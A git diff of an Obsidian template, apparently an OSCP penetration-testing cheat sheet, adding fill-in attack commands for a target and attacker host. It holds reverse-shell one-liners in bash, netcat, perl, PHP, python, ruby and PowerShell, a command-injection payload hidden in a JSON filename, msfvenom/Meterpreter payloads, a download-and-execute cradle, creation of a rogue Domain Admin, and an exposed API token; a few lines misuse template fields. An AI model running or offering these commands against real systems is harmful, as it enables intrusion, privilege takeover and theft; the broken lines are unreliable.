@@ -1,48 +1,3 @@
-# OSCP
-I used the Templater community plugin in obsidian to automatically populate IP,username,password
-Thanks siddicky for this cool idea! 
-
-I do have plans to actively maintain it if people like it
-
-
-
-
-https://www.youtube.com/watch?v=2NLi4wzAvTw&t=634s
-
-
-
-
-Have a look at this video, if youre wondering what im talking about! 
-
-
-Steps to use- 
-
-1-> Download obsidian, click on settings and browse "community plugins"
-
-
-2-> Install the Templater plugin by SilentVoid and enable the plugin
-
-
-3-> Copy the template and save 
-
-
-4->Create a new .md file and put in your desired values
-
-```
----
-LHOST: 1.1.1.1
-RHOST: 0.0.0.0
-USERNAME: username
-PASSWORD: password
-DOMAIN: domain	
----
-```
-
-5->press alt+e and select your template name
-
-BOOM
-	
-	
 
 ## Shells & stuff
 https://www.revshells.com/
@@ -52,22 +7,9 @@ https://www.revshells.com/
 # Get-NTLM from password
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<% tp.frontmatter["PASSWORD"] %>".encode("utf-16le")).digest())'
 
-# nishang
-cd path/to/nishang/Shells/
-cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
-Invoke-PowerShellTcp -Reverse -IPAddress <% tp.frontmatter["LHOST"] %> -Port <LPORT>
 
 powershell "IEX(New-Object Net.Webclient).downloadString('http://<% tp.frontmatter["LHOST"] %>:<LPORT>/Invoke-PowerShellTcp.ps1')"
 
-#msfvenom 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f exe -o reverse.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f dll -o reverse.dll
-
-# windows rev 
-$Text = '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
-$EncodedText =[Convert]::ToBase64String($Bytes)
-$EncodedText
 
 # php cmd 
 
@@ -106,9 +48,97 @@ Invoke-ConPtyShell <% tp.frontmatter["LHOST"] %> 3001
 #manual upgrade
 Invoke-ConPtyShell -Upgrade -Rows 23 -Cols 115
 
+
+# Execute Command as another user
+PS C:\> $SecurePassword = ConvertTo-SecureString '<% tp.frontmatter["PASSWORD"] %>' -AsPlainText -Force
+PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<% tp.frontmatter["USERNAME"] %>', $SecurePassword)
+PS C:\> $Session = New-PSSession -Credential $Cred
+PS C:\> Invoke-Command -Session $session -scriptblock { whoami }
+
+or
+$username = '<% tp.frontmatter["USERNAME"] %>'
+$password = '<% tp.frontmatter["PASSWORD"] %>'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process powershell.exe -Credential $credential
+
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+
+
+# Add new Domain Admin
+$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <% tp.frontmatter["PASSWORD"] %>
+New-ADUser -Name "<% tp.frontmatter["USERNAME"] %>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
+Add-ADGroupMember -Identity "Domain Admins" -Member <% tp.frontmatter["USERNAME"] %>
+
+#Execute Command in User Context
+$pass = ConvertTo-SecureString "<% tp.frontmatter["PASSWORD"] %>" -AsPlaintext -Force
+$cred = New-Object System.Management.Automation.PSCredential ("<% tp.frontmatter["DOMAIN"] %>\<% tp.frontmatter["USERNAME"] %>", $pass)
+Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
+
+#Execute Scripts with Creds (Reverse Shell)
+$pass = ConvertTo-SecureString "<% tp.frontmatter["PASSWORD"] %>" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("<% tp.frontmatter["DOMAIN"] %>\<% tp.frontmatter["USERNAME"] %>", $pass)
+Invoke-Command -Computer <% tp.frontmatter["RHOST"] %> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<% tp.frontmatter["LHOST"] %>/<FILE>.ps1') } -Credential $cred
+
+
 ```
 
 
+## Reverse shell
+```bash
+
+#reverse shell
+bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1
+bash -c 'bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1'
+echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1"' | base64
+
+# curl Reverse shell
+curl --header "Content-Type: application/json" --request POST http://<% tp.frontmatter["RHOST"] %>:<RPORT>/upload --data '{"auth": {"name": "<% tp.frontmatter["USERNAME"] %>", "password": "<% tp.frontmatter["PASSWORD"] %>"}, "filename" : "& echo "bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1"|base64 -d|bash"}'
+
+#mkfifo Reverse shell
+mkfifo /tmp/shell; nc <% tp.frontmatter["LHOST"] %> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
+
+#netcat reverse shell
+nc -e /bin/sh <% tp.frontmatter["LHOST"] %> <LPORT>
+
+#perl reverse shell
+perl -e 'use Socket;$i="<% tp.frontmatter["LHOST"] %>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#PHP reverse shell
+php -r '$sock=fsockopen("<% tp.frontmatter["LHOST"] %>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#msfvenom 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f exe -o reverse.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f dll -o reverse.dll
+
+#Powershell Reverse shell
+$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+
+#python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
+
+#ruby reverse shell
+ruby -rsocket -e'f=TCPSocket.open("<% tp.frontmatter["LHOST"] %>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# nishang
+cd path/to/nishang/Shells/
+cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
+Invoke-PowerShellTcp -Reverse -IPAddress <% tp.frontmatter["LHOST"] %> -Port <LPORT>
+
+```
 
 ## File Sharing
 ```bash
@@ -117,7 +147,7 @@ Invoke-ConPtyShell -Upgrade -Rows 23 -Cols 115
 certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/reverse.exe
 certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Linux/linpeas.sh
 certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/
-certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/Mimikatz/mimikatz.exe
+certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/mimikatz/mimikatz.exe
 certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/exe/winPEASany.exe
 
 c:/users/public/
@@ -141,8 +171,22 @@ wget -m http://<% tp.frontmatter["LHOST"] %>/<FILE>
 
 curl http://<% tp.frontmatter["LHOST"] %>/<FILE> > <OUTPUT_FILE>
 
+#MSF
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -f exe -o <FILE>.exe
 
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <% tp.frontmatter["LHOST"] %>
+LHOST => <% tp.frontmatter["LHOST"] %>
+msf6 exploit(multi/handler) > set LPORT <LPORT>
+LPORT => <LPORT>
+msf6 exploit(multi/handler) > run
 
+.\<FILE>.exe
+
+meterpreter > download *
 ```
 
 
@@ -152,6 +196,15 @@ curl http://<% tp.frontmatter["LHOST"] %>/<FILE> > <OUTPUT_FILE>
 # nmapAutomator
 ./nmapAutomator.sh -H  <% tp.frontmatter["RHOST"] %> -T All
 
+#nmap
+sudo nmap -A -T4 -sC -sV -p- <% tp.frontmatter["RHOST"] %>
+sudo nmap -sV -sU <% tp.frontmatter["RHOST"] %>
+sudo nmap -A -T4 -sC -sV --script vuln <% tp.frontmatter["RHOST"] %>
+sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <% tp.frontmatter["RHOST"] %>
+sudo nmap -sC -sV -p- --scan-delay 5s <% tp.frontmatter["RHOST"] %>
+sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <% tp.frontmatter["RHOST"] %>
+ls -lh /usr/share/nmap/scripts/*ssh*
+locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 
 # evil-winrm
 evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -p '<% tp.frontmatter["PASSWORD"] %>'
@@ -259,8 +312,23 @@ Import-Module .\adPEAS.ps1
 Invoke-adPEAS
 Invoke-adPEAS -Domain '<% tp.frontmatter["DOMAIN"] %>' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor
 
+#### Certipy
+certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["DOMAIN"] %> -p <% tp.frontmatter["PASSWORD"] %>
+certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %> -p <% tp.frontmatter["PASSWORD"] %> -vulnerable -stdout
 
+#rpcclient
+rpcclient -U "" <% tp.frontmatter["RHOST"] %>
 
+# msfvenom && metasploit execution
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
+
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <% tp.frontmatter["LHOST"] %>
+msf6 exploit(multi/handler) > set LPORT <% tp.frontmatter["LHOST"] %>
+msf6 exploit(multi/handler) > run
+
+.\exploit.exe
 ```
 
 
@@ -343,7 +411,7 @@ wpscan --url http://<% tp.frontmatter["RHOST"] %> -U <% tp.frontmatter["USERNAME
 wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://<% tp.frontmatter["RHOST"] %> --plugins-detection aggressive
 
 <example>
-wpscan --url [http://192.168.243.244](http://192.168.243.244) --enumerate p --plugins-detection aggressive  --api-token qLVQId1asdasdVQzt2zhHuassrdBsaaSpxcanRW6qSA
+wpscan --url [http://192.168.243.244](http://192.168.243.244) --enumerate p --plugins-detection aggressive  --api-token qLVQId1c9vb4suVQzft2zhHusr9BsSaSpxcanRW6qSA
 <example>
 
 
@@ -447,8 +515,8 @@ RunasCs
 ./RunasCs.exe -d <% tp.frontmatter["DOMAIN"] %> "<% tp.frontmatter["USERNAME"] %>" '<% tp.frontmatter["PASSWORD"] %>' cmd.exe -r <% tp.frontmatter["LHOST"] %>:<LPORT>
 
 winexe
-winexe -U '<USERNAME%PASSWORD>' //<% tp.frontmatter["RHOST"] %> cmd.exe
-winexe -U '<USERNAME%PASSWORD>' --system //<% tp.frontmatter["RHOST"] %> cmd.exe
+winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' //<% tp.frontmatter["RHOST"] %> cmd.exe
+winexe -U '<% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>' --system //<% tp.frontmatter["RHOST"] %> cmd.exe
 ```
 
 
